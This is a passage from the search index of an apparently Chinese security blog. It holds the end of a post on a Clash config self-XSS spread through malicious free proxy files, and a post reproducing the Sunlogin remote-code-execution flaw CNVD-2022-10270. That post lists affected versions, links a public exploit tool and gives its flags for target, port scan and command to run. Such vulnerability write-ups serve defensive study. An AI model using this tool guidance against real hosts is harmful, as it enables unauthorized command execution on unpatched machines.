alt="image-20220301230010284"></p><p>命令执行成功</p><p>由此看来这个漏洞有些鸡肋属于<code>self-xss</code>但是要知道Clash的配置文件大部分都是从代理url下载而来，这样以来危险也就由之而来，一些心存心存恶念的人提供一些免费的代理导致贪图便宜的兄弟中招，也就是常见的钓鱼</p><p>并且大部分人使用Clash不会去详细看yml文件，直接下载下来使用最后中招。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>将Clash更新到最新版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向日葵 RCE复现</title>
      <link href="/posts/35386fe0/"/>
      <url>/posts/35386fe0/</url>
      
        <content type="html"><![CDATA[<h1 id="Sunlogin-RCE复现-CNVD-2022-10270"><a href="#Sunlogin-RCE复现-CNVD-2022-10270" class="headerlink" title="Sunlogin RCE复现(CNVD-2022-10270)"></a>Sunlogin RCE复现(CNVD-2022-10270)</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270">https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270</a></p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>windows 个人版 V11.0.0.33 V10.3.0.27372 V11.0.0.33162</p><p>简约版 V1.0.1.43315</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Mr-xn/sunlogin_rce/releases">Releases · Mr-xn&#x2F;sunlogin_rce (github.com)</a></p><p>使用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-h 指定目标</span><br><span class="line"></span><br><span class="line">-t 选择扫描或者命令执行 默认scan</span><br><span class="line"></span><br><span class="line">-p 设置扫描端口范围 默认40000到65535</span><br><span class="line"></span><br><span class="line">-c 需要执行的命令</span><br></pre></td></tr></table></figure><p><img src="/posts/35386fe0/j3qNXASt5GWPMpB.png" alt="image-20220515223200470"></p><p><img src="/posts/35386fe0/qkTbI1ZLEyu2lHM.png" alt="image-20220515223216200"></p><p>经测试好像只有本机利用才会有回显</p><p><img src="/posts/35386fe0/xsfCZyJtE1L2ilj.png" alt="image-20220515223628294"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
